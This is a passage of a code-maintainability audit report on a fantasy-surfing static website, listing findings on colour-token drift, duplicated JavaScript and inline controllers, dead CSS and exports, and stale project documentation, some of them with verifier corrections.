- **⚠️ Verifier correction:** The real, verified defect: admin.html uses #f7f5f0 (rgb 247,245,240) as a panel/header/log background 5 times (lines 373, 1335, 1848, 1853, 1867), 2 blue-channel units off the --color-cream token #F7F5F2 — effectively the cream color but bypassing the token. That single substitution (5 call sites -> var(--color-cream)) is the legitimate fix. However: (a) #fefdfb and #f8f7f4 are NOT hardcoded-once-in-CSS bugs — they appear only as their token definitions; about.html:73's #f8f7f4 is a deliberate var() fallback. (b) There are NOT "three+ near-identical off-white backgrounds"; only the admin #f7f5f0 collision is real. (c) Of 32 #fff, only 7 are background surfaces worth auditing; 25 are color:#fff text-on-fill that should stay #fff (or become an --color-on-accent token), which the recommendation already concedes — so "audit the 32" should read "audit the 7 background uses." Net: medium-severity inconsistency is overstated; the true issue is small (1 color value, 5 admin call sites) plus an optional 7-surface #fff-background cleanup.

#### F-15 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Two unrelated 'podium' color systems: tokenized leaderboard ranks vs hardcoded finish-place medals**

- **Category:** color-tokens
- **Evidence:** Leaderboard rank 1/2/3 correctly use palette tokens: css:747-749 `--color-terracotta` / `--color-sage-dark` / `--color-warm-brown`. But data.html:23-31 defines a totally separate, bright, un-tokenized medal palette for finish places: .place-1 #f5d060/#5a4200 (gold), .place-2 #d0d5dd/#2f2f2f (silver), .place-3 #d4a97a/#3a2400 (bronze), .place-5 #c8e6c9/#1b5e20, .place-9 #e8f4fd/#1a3a50, .place-33 #fce4ec/#880e4f. Gold here (#f5d060) also nearly duplicates the ads-coin-badge gold #f0d060 (css:998).
- **Impact:** The app shows 'first place' in two completely different color languages depending on page — muted terracotta on standings, bright gold on the data/results page. Eight more bright literals (blues, pinks, greens) live only in data.html with no token coverage, the largest single un-tokenized color block outside fantasy.css. The two near-identical golds (#f5d060 vs #f0d060) will drift.
- **Recommendation:** Decide on one podium language. If the bright medal palette is intentional for results tables, promote it to tokens (`--medal-gold`, `--medal-silver`, `--medal-bronze` + their text colors) in :root so data.html and any future results view share them, and reconcile the two golds. If not, restyle finish places onto the existing terracotta/sage/brown system for cross-page consistency.

#### F-16 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Status/badge colors duplicated between CSS classes and JS-injected inline styles**

- **Category:** color-system
- **Evidence:** Badge state colors are defined as CSS classes (badge--live/open #dff5e3+#217a3c css:401-414, inline-select--status mirrors them css:1656-1681) but the live-status banner in js/ui.js:247 re-encodes the same 'live' green as a raw inline `background:rgba(33,122,60,0.12)` string, and js/ui.js:144 injects WSL status badges with `background:${status.statusColor || '#616161'};color:#fff` — pulling an arbitrary hex from the scraped WSL page (wsl-scrape.js:449) with a hardcoded #616161 fallback that exists nowhere else in the palette.
- **Impact:** The same 'live/active' semantic is maintained in two places (CSS class + JS string) that can drift, and the WSL-status path injects externally-controlled colors plus an off-palette gray fallback (#616161) directly into markup. Status styling has no single home, which is exactly the redundancy the owner's UX guidance warns against.
- **Recommendation:** Route all status/badge styling through CSS classes; have ui.js add a class (`live`, `status-default`) rather than building inline color strings. Map the #616161 fallback to a palette neutral (`--color-warm-gray`). If WSL's scraped statusColor must be honored, constrain/whitelist it rather than injecting arbitrary hex into a style attribute.

#### F-17 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Token fallback in about.html disagrees with the token's real value**

- **Category:** color-tokens
- **Evidence:** about.html:80 writes `background: var(--color-beige, #ede8df)` but the actual token (css:17) is `--color-beige: #E8E4DF`. The fallback #ede8df rgb(237,232,223) differs from the real #E8E4DF rgb(232,228,223). about.html:73 uses `var(--color-off-white, #f8f7f4)` which DOES match (good).
- **Impact:** Harmless while fantasy.css loads (the var resolves to the real value), but if the stylesheet ever fails or about.html is viewed standalone, the beige renders a visibly different shade than every other page. It also signals the fallback was typed from memory rather than copied from the token, the kind of drift that erodes trust in the token values.
- **Recommendation:** Fix the fallback to `#E8E4DF` to match the token, or drop the fallback entirely since fantasy.css is always loaded. Quick grep for other `var(--…, #literal)` fallbacks (club.html:361 has them) and verify each matches its token.

#### F-18 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Terracotta hover shade #b36a52 is an untokenized derivative of --color-terracotta**

- **Category:** color-tokens
- **Evidence:** css:336-338 btn--secondary base correctly uses `var(--color-terracotta)` (#C97A60), but its hover state css:341-342 hardcodes the darker `#b36a52` for both background and border with no token. This is the only place the darker terracotta appears, so there's no canonical 'terracotta-dark' the way `--color-sage-dark` exists for sage.
- **Impact:** The palette has sage/sage-dark as a pair but terracotta has no dark counterpart, so the one hover shade floats as a literal. Minor, but inconsistent with how the sage pair is modeled and means a terracotta retune misses the hover.
- **Recommendation:** Add `--color-terracotta-dark: #b36a52` to mirror the `--color-sage-dark` pattern and reference it at css:341-342. Low priority but cheap and makes the palette symmetric.

#### F-19 · 🔵 LOW · effort: large · ✅ verified (high conf.)

**No spacing/sizing scale tokens; radii and shadows are tokenized but sometimes bypassed**

- **Category:** spacing-radii-shadows
- **Evidence:** There are zero spacing tokens (grep for `--space|--gap|--pad` = 0); every padding/gap/margin is a raw rem literal repeated across CSS and ~250 inline style= attributes (admin 85, profile 41, club 32). Radii ARE tokenized (--radius-sm/md/lg, 8/19/1 refs) but inline styles bypass them with literal `border-radius:6px` (admin.html:373,1333,etc.), `4px`, `999px`, `100px` — none of which map to the 2/4/8px token scale. --shadow-sm/md exist (2/4 refs) but ui.js:737 injects `box-shadow:0 8px 32px rgba(0,0,0,0.25)` directly.
- **Impact:** Spacing has no single source of truth, so vertical rhythm is whatever each author typed; this is the main reason inline style= attributes proliferate (250+). The `6px`/`999px` radii used in inline styles don't exist in the token scale (2/4/8), so card corners on admin panels don't match token-styled components.
- **Recommendation:** Lower priority given the no-build constraint, but worth (a) reconciling inline `border-radius:6px` to `var(--radius-lg)` (8px) or adding a `--radius-card` token, and (b) considering a minimal `--space-1..-6` scale to absorb the most-repeated rem values. Do NOT over-engineer a full spacing system change-for-change's-sake; target only the radii literals that visibly mismatch the token scale.


### JS Architecture

#### F-20 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**ui.js is an 819-line god-module mixing seven unrelated concerns**

- **Category:** separation-of-concerns
- **Evidence:** js/ui.js exports 18 functions spanning: header/footer/nav rendering (renderHeader L220-327, renderFooter L332-341), banner/countdown/live-status logic (resolveCountdownState L49, fetchLiveStatusCached L96, renderLiveStatusBanner L137, startCountdownTimer L155, renderBanners L186), formatters (formatSalary/formatSalaryFull/formatDate/locationForEvent L346-431), badges (statusBadge/tradingBadge L434-448), toast (L470-493), confirmModal (L502-572), a full ~115-line profile-edit modal with file-upload + drag-drop (openProfileEditModal L580-695), and loading/auth-gate views (L699-819). The 230-line LOCATION_MAP/PATTERNS venue table (L370-420) is data, not UI primitives.
- **Impact:** Every page that only needs formatSalary or statusBadge pulls the whole module's source (parse + eval cost), and unrelated concerns churn the same file, raising merge-conflict surface and making the file hard to navigate. The profile-edit modal and the WSL-venue location map in particular are self-contained features that have no reason to live beside toast()/formatDate().
- **Recommendation:** Split into focused modules without changing the no-build model: js/format.js (formatSalary/Full/Date, statusBadge, tradingBadge, locationForEvent + the LOCATION_MAP data), js/banners.js (countdown + live-status helpers + renderBanners), js/modals.js (toast, confirmModal, openProfileEditModal, showLoading, showAuthGate), and keep js/ui.js as just header/footer/nav. Pages already import named symbols, so the import-list edits are mechanical. Not urgent — defer unless touching this area.

#### F-21 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**Salary-cap and roster-size constants duplicated between team.js and pricing.js, tied only by a comment**

- **Category:** single-source-of-truth
- **Evidence:** team.js:5-8 TEAM_RULES = { mens:{rosterSize:8, salaryCap:50_000_000}, womens:{rosterSize:5, salaryCap:35_000_000} }. pricing.js:50-53 PRICING = { mens:{starters:8, cap:50_000_000,...}, womens:{starters:5, cap:35_000_000,...} } — the same $50M/$35M caps and 8/5 squad sizes re-stated. pricing.js:49 comment literally says 'cap matches TEAM_RULES in team.js', acknowledging the manual coupling.
- **Impact:** If a cap or roster size is ever retuned, changing it in TEAM_RULES (validation) without also editing PRICING silently makes the pricing curve solve to the wrong target pool — surfer values would no longer be tenable against the real cap, with no error. This is the kind of cross-module invariant that the integrity-focused design elsewhere avoids.
- **Recommendation:** Have pricing.js import cap/starters from a shared source. Cleanest: export the cap+roster numbers from team.js (or a tiny js/league-rules.js) and have PRICING reference TEAM_RULES[tour].salaryCap / .rosterSize, keeping only pricing-specific knobs (peak, poolFactor) local. Removes the duplicate literals and the 'must match' comment.

#### F-22 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**getEvent and getEventFresh are byte-for-byte identical; the 'fresh/bypasses cache' distinction is illusory**

- **Category:** dead-code-and-clarity
- **Evidence:** js/db.js:94-97 getEvent() and js/db.js:107-112 getEventFresh() have identical bodies: `const snap = await getDoc(doc(db, "events", eventId)); return snap.exists() ? { id: snap.id, ...snap.data() } : null;`. The comment at L107-108 says getEventFresh 'bypasses all caches… for trading-critical checks where stale data = exploit', but getEvent already does a direct getDoc with no caching — only getEvents() (plural, L46) uses sessionStorage. getEventFresh is referenced 7× across pages, getEvent's single-doc path is never cached, so the two are functionally interchangeable.
- **Impact:** Two names for one behavior invites a future maintainer to 'optimize' getEvent by adding a cache (it looks unused-ish) and silently break the trading-critical callers that picked getEventFresh for its documented guarantee. The guarantee is real but is provided by getEvent too, undocumented.
- **Recommendation:** Either (a) delete getEventFresh and point callers at getEvent, adding the 'always a direct read' note to getEvent's doc, or (b) keep getEventFresh as the canonical single-doc read and remove getEvent, updating its callers. Pick one canonical name so the no-cache guarantee is anchored to a single function.

#### F-23 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**getCurrentUser and getUserProfile are exported but never imported anywhere (dead exports)**

- **Category:** dead-code
- **Evidence:** grep across all *.html and js/*.js shows js/auth.js:111 getCurrentUser and js/auth.js:116 getUserProfile appear ONLY at their own definition lines — zero call sites. Pages get the user/profile via the onAuth(user, profile) callback instead, so these getters are unused.
- **Impact:** Dead public API. Low harm, but the user's own code-hygiene memory explicitly flags 'no orphan code; keep imports/exports tidy', and these two read as intended-but-abandoned accessors that a maintainer might assume are live.
- **Recommendation:** Delete both exports (and the backing pattern is already covered by onAuth/requireAuth). If a non-callback synchronous read is ever wanted, re-add one then. Trivial removal.

#### F-24 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**A module documented as 'pure logic' uses Math.random(), making computeFinishPositions non-deterministic**

- **Category:** purity-and-testability
- **Evidence:** wsl-resolve.js header (L1) declares 'Pure logic'. But computeFinishPositions tiebreaks exact heat-total ties with `return Math.random() - 0.5;` at js/wsl-resolve.js:161. Confirmed it's the only side-effect signal in the four 'pure' modules (scoring/team/pricing/wsl-resolve all clean otherwise — no Date.now, fetch, DOM, storage).
- **Impact:** Same inputs can yield different finish orderings across runs, so the function isn't referentially transparent. The code does flag tie groups as warnings (L149-155), so it's intentional and visible to the admin — but it undercuts re-running a scrape to reproduce a result, and complicates any future unit test of the placement walk.
- **Recommendation:** Either rename the module's doc claim to 'mostly-pure (random tiebreak)', or make the tiebreak deterministic (e.g. break exact ties by wslId or displayName) and keep the existing warning so the admin still manually verifies. Deterministic tiebreak is the cleaner fix and changes no observable behavior except reproducibility. Fine as-is if reproducibility isn't valued.

#### F-25 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Surfer active/inactive status-derivation logic duplicated in 3 places**

- **Category:** duplication
- **Evidence:** The expression `s.status || (s.active === false ? "inactive" : "active")` (handling the legacy boolean `active` field vs the newer `status` string) appears at js/db.js:26-27, admin.html:269, and admin.html:1586. db.js uses it to filter getSurfers(); admin re-derives it for row styling and for the event-eligible filter.
- **Impact:** A small piece of backward-compat business logic spread across the data layer and the page controller. If the legacy-field handling ever changes (e.g. a third status), three sites must move together or the admin view and the public surfer list disagree about who's active.
- **Recommendation:** Export a tiny `surferStatus(surfer)` (or `isActiveSurfer(surfer)`) helper from db.js (or team.js) and call it in all three places. Minor consolidation; only worth doing when next editing surfer code.

#### F-26 · ⚪ INFO · effort: small · ✅ verified (high conf.)

**ui.js reaches across layers via dynamic import to db.js/wsl-scrape.js (lazy-load, not cycle-break) — acceptable but worth flagging**

- **Category:** layering
- **Evidence:** ui.js statically imports only auth.js (L1) but dynamically pulls db.js (L188 getCurrentEventForTour/getSiteConfig, L687 updateUser), wsl-scrape.js (L110 fetchLiveEventStatus), and firebase-config storage (L675). Verified db.js imports only firebase-config, so a static ui→db import would NOT be circular — the dynamic form is a deliberate lazy-load (non-banner pages skip wsl-scrape entirely; formatter-only pages defer db/storage cost), not a cycle workaround.
- **Impact:** Mostly positive: the wsl-scrape lazy import genuinely avoids loading the 468-line scraper on pages that never show a banner. The downside is the dependency graph isn't fully visible from static imports — a reader scanning ui.js's header sees only auth.js and could miss that it also drives event/config reads and the scraper. Splitting the banner code into its own module (see ui.js god-module finding) would localize these dynamic imports and make the dependency obvious.
- **Recommendation:** Keep the lazy imports (they pay off), but if/when ui.js is split, move the db/wsl-scrape dynamic imports into the banners module so a UI primitive file (formatters/toast) has zero data-layer coupling. No change needed otherwise — this is sound as-is.

#### F-27 · ⚪ INFO · effort: small · ✅ verified (high conf.)

**getEvents fetches the whole events collection then filters by season client-side; club lookup scans all clubs**

- **Category:** scalability
- **Evidence:** js/db.js:57-61 getEvents() does `getDocs(collection(db,"events"))` then `.filter(e => e.season === season)` in JS rather than a `where("season","==",season)` query — unlike getResults/getTeamsForEvent/getLeaderboard which do use where(). js/db.js:391-395 getClubByInviteCode() also pulls the entire clubs collection and find()s by inviteCode in memory.
- **Impact:** Negligible today (one CT season is ~12 events; clubs are few) and getEvents is version-cached, so it's a non-issue at current scale. It only matters if events accumulate across many seasons in one collection or clubs grow large, at which point full reads cost bandwidth and Firestore read quota.
- **Recommendation:** Leave as-is for now — the owner explicitly disfavors change-for-change's-sake and the data volumes don't justify it. If a multi-season events collection ever materializes, switch getEvents to a where("season") query (and consider an inviteCode index for getClubByInviteCode). Note only.


### Inline Controllers

#### F-28 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**Event-by-event leaderboard table is duplicated across standings.html and club.html (largest cross-page dup)**

- **Category:** maintainability
- **Evidence:** standings.html:106-160 `standingsTable()` and club.html:388-425 each render a near-identical sticky-scroll `<table class="data-table scroll-table">`: same Rank/Player/Total sticky columns, same per-event `evt-col` headers with `locationForEvent(e.name)` + sort arrows, same scoring-mode toggle (`scoringMode`/`clubScoringMode`, club.html:378-379 vs standings.html:178-179), same live `~pts` projection styling (standings.html:147-153 `inProgressIds.has(e.id)` vs club.html:421 `projectedIds.has(e.id)`). The only real divergence is magic sticky offsets that have already drifted: standings uses `left:232px`/176px player col, club uses `left:196px`/140px (grep: `left:56px` x4, `left:232px` x2, `left:196px` x2).
- **Impact:** Any change to the standings table (a column, a style token, the live-projection treatment) must be made in two places with hand-adjusted pixel offsets, and they are already inconsistent. This is the single biggest source of copy-paste in the page layer (~55 lines each).
- **Recommendation:** Extract one `renderStandingsTable({ players, tourEvents, scoringMode, inProgressIds, highlightUserId, playerColWidth })` into ui.js (or a new js/standings-table.js). Drive the sticky offsets from the single `playerColWidth` param instead of hardcoding 196/232. Both pages then call it; the club page just passes its narrower column width and member-filtered entries.

#### F-29 · 🟡 MEDIUM · effort: small · ⚠️ partial (high conf.)

**buildRankProgression chart helper is byte-identical between index.html and club.html and re-implements calculateSeasonStandings**

- **Category:** maintainability
- **Evidence:** club.html:256-272 and index.html:225-244 contain the same loop computing best-9-of-N standings per prefix of completed events: identical `scores = evSubset.map(...).filter(s=>s>0).sort((a,b)=>b-a); slice(0,9).reduce(...)` then `findIndex(user.uid)`. index.html just wraps it with an optional `memberIds` filter (index.html:226-228). The best-9 slice itself duplicates `calculateSeasonStandings` already exported from scoring.js (used only at admin.html:690).
- **Impact:** The best-9 scoring rule (a core business invariant) is expressed in at least three places — scoring.js, index.html, club.html — and also in the table totals (`bestNineTotal`). If the rule changes (e.g. best-10), it must be edited in multiple inline copies, risking divergence between the chart and the table on the same page.
- **Recommendation:** Move `buildRankProgression(entries, completedEventIds, targetUserId)` into scoring.js next to `calculateSeasonStandings`, and have it call the same best-N primitive. index/club import it. This also makes the season-scoring rule unit-testable in one spot.
- **⚠️ Verifier correction:** The substantive duplication is real and worth fixing: index.html:227-241 and club.html:257-271 contain a byte-identical 15-line best-9-of-N rank-progression loop (verified by `diff`, EXIT 0). It is NOT a byte-identical whole function — only the core loop matches; index.html adds a `memberIds` filter wrapper (224-226) and a different signature. The loop re-expresses the best-9-of-N season rule that scoring.js:236-255 `calculateSeasonStandings` already owns (which is currently used only at admin.html:690), but as a re-expression of the rule, not a copy of that function. Recommendation stands: extract `buildRankProgression(entries, completedEventIds, targetUserId)` into scoring.js and have both pages import it; note the helper currently closes over `user.uid` so the target must become a parameter. One caveat: factoring out a shared best-N primitive that both `calculateSeasonStandings` and the progression helper call is sound, but the two have different shapes (totals+tiebreaker vs rank-position-per-prefix), so the shared piece is just the `.filter(s>0).sort().slice(0,9).reduce()` total, not the whole standings computation.
- **✅ Resolved (2026-06-17):** `buildRankProgression(entries, completedEventIds, userId)` now lives in `scoring.js`; `index.html` + `club.html` import it (the `user.uid` closure became the `userId` param). The best-N total is a single internal `bestNTotal()` primitive called by *both* `buildRankProgression` and `calculateSeasonStandings`, so the best-9-of-N rule has exactly one home. Verified a no-op via a standalone equivalence test (ties, zeros, >N events, empty, ghost user). The two SVG `renderRankChart` renderers were intentionally left per-page — different aspect ratios for the dashboard vs the club pane share no markup, only the rank data.

#### F-30 · 🟡 MEDIUM · effort: trivial · ✅ verified (high conf.)

**splitName() + nameLabelHtml() surfer-tile helpers are duplicated verbatim between team.html and index.html**

- **Category:** maintainability
- **Evidence:** team.html:291-304 and index.html:117-130 are byte-for-byte identical (only indentation differs): same `splitName` (parts.pop() last-name split) and same `nameLabelHtml` emitting `<span class="team-row__name"><span class="team-row__firstname">...<span class="team-row__lastname">`. Both feed the shared `.team-row__surfer` CSS and are used to render the same roster strip (team.html:309-344, index.html:141-163).
- **Impact:** The dashboard roster strip and the team-builder roster strip are meant to look identical (MEMORY notes a high bar for pixel parity), but their name-formatting logic lives in two copies that can silently drift.
- **Recommendation:** Export `nameLabelHtml`/`splitName` (or a single `renderSurferTile`) from ui.js — they already depend only on shared `.team-row__*` CSS classes. Both pages import it. Pairs naturally with the roster-strip extraction below.

#### F-31 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**Repeated page-bootstrap preamble (initAuth + renderHeader + renderFooter + onAuth + SEASON) across 8-10 pages**

- **Category:** maintainability
- **Evidence:** The same 4-line preamble appears in club.html:41-45, profile.html:32-36, index.html:42-46, standings.html:33-37, surfers.html:230-234, plus the requireAuth/requireAdmin variants in team.html:449-453, event.html:32-36, admin.html:52-56. `const SEASON = 2026;` is independently declared in 8 files (club/standings/admin/event/profile/team/index/surfers). The auth-gate stanza `if (!user) { showAuthGate(main); return; } showLoading(main);` is repeated nearly verbatim in index/standings/profile/club.
- **Impact:** SEASON=2026 in 8 files means season rollover (an explicitly tracked initiative) requires editing 8 HTML files instead of one constant; easy to miss one. The boilerplate adds noise to every controller and there is no single place to change the page lifecycle.
- **Recommendation:** Add a `bootstrapPage({ requireAuth, requireAdmin, render })` helper to ui.js (or a new js/page.js) that runs initAuth/renderHeader/renderFooter, applies the guard, handles the showAuthGate/showLoading branch, and invokes `render(main, user, profile)`. Export `SEASON` from a shared constants module (e.g. js/config.js or scoring.js) and import it. Note: data.html:160-181 intentionally uses a try/catch degraded-mode bootstrap — keep that one as-is.

#### F-32 · 🟡 MEDIUM · effort: large · _opinion (not falsifiable)_

**admin.html (1913 inline lines) is five independent tab apps and should be decomposed into per-tab controller modules**

- **Category:** maintainability
- **Evidence:** admin.html renders 5 tabs (renderAdmin at admin.html:77, tab buttons admin.html:91-95: events/surfers/results/players/clubs) and wires them in large, mostly-independent inline blocks: `wireAdminEvents` (845), countdown banner (511), surfer modal+value repricing (1157, 1693-1801 IIFE), WSL scrape pipeline `wslLog`/`renderScrapeSummary`/`computeRepricing` (1294-1801), leaderboard recalc (641-741). It also does direct Firestore writes inline — `import { collection, doc, getDocs, writeBatch }` at admin.html:39, batch at 709 and a separate surfer-value batch at 1893 — the only page bypassing db.js.
- **Impact:** A single 102KB file mixes five unrelated admin concerns plus raw Firestore access; it is the hardest file to navigate, review, or test, and the largest blast radius for an accidental edit. The WSL/repricing logic in particular is meaty enough to deserve isolation.
- **Recommendation:** Split into js/pages/admin/*.js controllers (events.js, surfers.js, results.js, players.js, clubs.js) each exporting `render(container)` + `wire(container)`, with admin.html reduced to a thin tab switcher. The leaderboard-recalc inline batch is intentionally folded in (per CLAUDE.md, to prevent partial-write reintroduction) — keep that write path inside the admin module, not pushed to db.js, but the routine surfer-value batch at 1893 could move behind a db.js function. This is the single highest-payoff extraction.

#### F-33 · 🔵 LOW · effort: trivial · ⚠️ partial (high conf.)

**Avatar tile (img-with-fallback) ternary is copy-pasted across standings/profile/club instead of a ui.js primitive**

- **Category:** maintainability
- **Evidence:** The same `avatarUrl ? <img ... referrerpolicy="no-referrer" onerror="this.style.display='none'"> : <div class="avatar-sm avatar-sm--empty">{initial}</div>` pattern appears at standings.html:136-137, club.html (player cell), and profile.html:301 (avatar-lg variant). `referrerpolicy="no-referrer" onerror` grep hits 2 files plus the club inline.
- **Impact:** Low individually, but it is a textbook shared UI atom (with a subtle but important `referrerpolicy="no-referrer"` needed for Google avatar URLs) that is easy to get wrong when re-typed. ui.js already owns statusBadge/tradingBadge of exactly this flavor.
- **Recommendation:** Add `avatarTile(url, name, size = 'sm')` to ui.js returning the img/fallback markup; replace the three inline copies. Trivial and consistent with the existing ui.js badge helpers.
- **⚠️ Verifier correction:** The img-with-fallback ternary genuinely appears 4 times, none in club.html: standings.html:135-137 (avatar-sm), profile.html:301-302 (avatar-lg), js/ui.js:273-275 (nav-avatar, renderHeader), js/ui.js:583-585 (avatar-preview, openProfileEditModal). club.html has NO avatar rendering — it only plumbs avatarUrl into entries (club.html:196,203); the player cell (413-417) is a plain text link. The four real copies differ only in CSS class (avatar-sm / avatar-lg / nav-avatar / avatar-preview) and the empty-state fallback wrapper, so a parameterized avatarTile(url, name, size) in ui.js could fold all four — including the two ui.js sites — into one helper. The de-dup opportunity is real and low-severity; the file list and hit count in the original claim are inaccurate.

#### F-34 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**Roster-strip rendering logic lives only in team.html but the dashboard rebuilds an equivalent strip inline**

- **Category:** maintainability
- **Evidence:** team.html:309-344 `renderRosterStrip(team, tour)` builds the `.team-row` strip of surfer tiles + ALT; index.html:141-163 builds the same `.team-row__surfer`/`team-row__alt-label` markup inline using the duplicated `nameLabelHtml`, both starting from `padToSparseRoster` (imported from ui.js in both). The shared part (`padToSparseRoster`) is already extracted; the tile-assembly is not.
- **Impact:** The two surfaces that must render an identical-looking roster strip (per the pixel-parity bar in MEMORY) keep their tile-assembly in separate inline copies, so a visual tweak to one can desync from the other.
- **Recommendation:** Once nameLabelHtml moves to ui.js, lift `renderRosterStrip` there too (read-only, no team-builder state) and have index.html call it. Defer if the two strips have intentional differences (team strip is interactive-adjacent) — verify before merging.

#### F-35 · 🔵 LOW · effort: medium · ✅ verified (high conf.)

**Inline style= attributes and hardcoded chart/colors scattered through controllers undercut the design-token system**

- **Category:** maintainability
- **Evidence:** admin.html carries 95 inline `style=` attributes, profile.html 42, club.html 34, standings.html 27, team.html 26. The duplicated standings tables encode layout (sticky offsets, widths, font sizes) entirely in inline style strings rather than CSS classes. Chart colors are hardcoded in JS: index.html and club.html:274-275 define `MENS_LINE_COLOR = "#7D8975"` / `WOMENS_LINE_COLOR = "#B0837A"` (the sage-dark token's literal value, re-typed) rather than reading the CSS var.
- **Impact:** Cross-cutting with the CSS-tokens dimension, but specifically: heavy inline styling inside the controllers makes the table markup hard to read/extract and means restyling requires editing JS template strings; the re-typed hex chart colors will drift from --color-sage-dark if the token changes.
- **Recommendation:** When extracting the shared standings table, move its layout into named CSS classes (.standings-table__rank-col etc.) so the controller emits classes not style strings. For chart colors, read `getComputedStyle(document.documentElement).getPropertyValue('--color-sage-dark')` or define the chart palette once. Not urgent on its own; do it opportunistically during the table extraction.

#### F-36 · ⚪ INFO · effort: trivial · _opinion (not falsifiable)_

**Extraction payoff ranking (no finding to fix — guidance)**

- **Category:** maintainability
- **Evidence:** Sizes: admin.html 1913, team.html 878, club.html 517, data.html 441, surfers.html 428, index.html 382, profile.html 339, standings.html 240, event.html 165, about.html 16 inline JS lines.
- **Impact:** Helps sequence the work so effort lands where duplication/size is worst, avoiding change-for-change's-sake on already-fine pages.
- **Recommendation:** Rank by payoff: (1) Shared standings-table + buildRankProgression + best-N → unblocks standings/club/index simultaneously, small-to-medium effort, removes the most duplication. (2) bootstrapPage helper + shared SEASON constant → touches all pages cheaply and de-risks season rollover. (3) nameLabelHtml/avatarTile/renderRosterStrip → trivial ui.js atoms. (4) admin.html per-tab decomposition → largest effort, biggest single-file win, do last and incrementally. LEAVE AS-IS: about.html (16 lines), event.html (165, mostly unique), data.html's deliberate degraded-mode bootstrap (data.html:165-181), and the admin leaderboard-recalc inline batch (intentional per CLAUDE.md). team.html at 878 lines is large but cohesive (one feature, the team builder) — only worth splitting its pure helpers, not the whole controller.


### Dead Code

#### F-37 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Two truly dead exports in auth.js: getCurrentUser() and getUserProfile()**

- **Category:** dead-code
- **Evidence:** js/auth.js:111 `export function getCurrentUser() { return currentUser; }` and js/auth.js:116 `export function getUserProfile() { return currentUserProfile; }`. Grep across all *.html + *.js (`grep -rn '\bgetCurrentUser\b'` / `getUserProfile`) returns ONLY the two export-definition lines — no import statement, no call site anywhere. Every page instead receives user+profile via the onAuth() callback args, so these accessors are never needed.
- **Impact:** Pure dead API surface. Harmless at runtime but misleads future readers into thinking there's a getter-based access pattern that nobody uses, and adds to the auth.js public contract that must be mentally maintained.
- **Recommendation:** Delete both functions (and the `currentUser`/`currentUserProfile` module vars only if nothing else reads them — verify they're still needed by onAuth dispatch first). If you want to keep them as a deliberate public accessor API, add a one-line comment saying so.

#### F-38 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**~34 dead CSS selectors in fantasy.css, including two whole orphan component blocks and two empty rules**

- **Category:** dead-css
- **Evidence:** Extracted all 208 class selectors from css/fantasy.css and grepped each against all HTML/JS (excluding css/), accounting for dynamic construction (badge--${status}, toast--${type}, leaderboard-rank--${rank}, team-row__change--${dir}, btn--${confirmTone}). 34 have zero references: the entire .profile-widget* block (css:1575-1623, 6 selectors), the entire .team-strip*/.team-photo-strip block (css:1177-1211, 6 selectors), .price-delta/.price-delta--up/--down (css:1135-1145), .surfer-row__country/__info/__meta/__action and --alternate/--drag-over, .btn--secondary + :hover (css:335-340; confirmTone is only ever "primary"/"danger" per admin.html:808/1061/1085/1517/1886), .btn--icon (css:376), .grid--3/.grid--team, .filter-select, .form-textarea, .search-bar, .section-header, .text-sage, .text-terracotta, .surfer-photo--empty. Plus two empty rules: .dash-content-cap {} (css:1287, also unreferenced) and .team-card {} (css:1305, referenced once in markup but the rule has no declarations).
- **Impact:** Roughly 150-200 lines of unreachable CSS. Bloats the single stylesheet, makes the design-token/component story harder to follow, and the orphan .profile-widget*/.team-strip* blocks imply UI components that were removed or never shipped — readers waste time hunting for where they render.
- **Recommendation:** Remove the confirmed-dead selectors. Prioritize the two large orphan blocks (.profile-widget*, .team-strip*) and the two empty rules. Keep dynamically-constructed families intact (badge--*, toast--*, leaderboard-rank--*). This is a safe, mechanical cleanup since each was verified zero-reference.

#### F-39 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**CLAUDE.md documents a 'Seed Data' admin tab that no longer exists in admin.html**

- **Category:** stale-docs
- **Evidence:** CLAUDE.md:94 lists a 'Seed Data' tab as a removable legacy bootstrap. But admin.html:92-96 defines exactly five tabs — Events, Surfers, Results, Players, Clubs — with no Seed tab. `grep -in 'Seed Data\|seedData\|seedSchedule\|seedSurfers'` in admin.html returns nothing; the only 'seed' hits are unrelated comments (admin.html:653 leaderboard seed entries, admin.html:977). The brief's hint to evaluate removing the Seed Data tab is moot — it's already gone.
- **Impact:** The authoritative project doc lists a feature/tab that isn't there, so anyone (human or AI) trusting CLAUDE.md will look for code that doesn't exist or assume a deletion task remains. Doc/code drift erodes trust in CLAUDE.md as the source of truth.
- **Recommendation:** Remove the 'Seed Data' bullet from CLAUDE.md's Admin Page section (line 94). While there, confirm no orphan seed* helper functions remain in admin.html (I found none with surviving call sites).

#### F-40 · ⚪ INFO · effort: trivial · ✅ verified (high conf.)

**Leftover bootstrap artifacts in data/: two Python scripts + rankings_2025.txt never used by the app**

- **Category:** orphan-asset
- **Evidence:** data/parse_rankings_2024.py, data/parse_rankings_2025.py, data/rankings_2025.txt. `grep -rn 'parse_rankings\|rankings_2025'` across *.html/*.js returns nothing — the app never fetches or references them. parse_rankings_2025.py:28 hardcodes a foreign absolute path `/Users/msierks/surfing/gladtobebrad.github.io/rankings_2025.txt` (a different machine's username) and just `print(json.dumps(...))` to stdout — a one-off local conversion tool. git log shows they were last touched only by 'Move data files into data/ folder'.
- **Impact:** Dead one-time tooling shipped to a public GitHub Pages site. No runtime effect, but it's confusing dev cruft (the hardcoded /Users/msierks path is obviously stale) sitting in a production static-hosting root.
- **Recommendation:** Delete the two .py scripts and rankings_2025.txt, or relocate them out of the deployed site into a non-published tools/ dir or a gist. If kept for provenance, add a README note that they are inert bootstrap scripts. Note: do NOT lump data/wsl_results/*.json into this — those ARE live (see separate finding).

#### F-41 · ⚪ INFO · effort: small · ✅ verified (high conf.)

**Cluster of JS exports used only inside their own module (export keyword is redundant)**

- **Category:** over-exposed-api
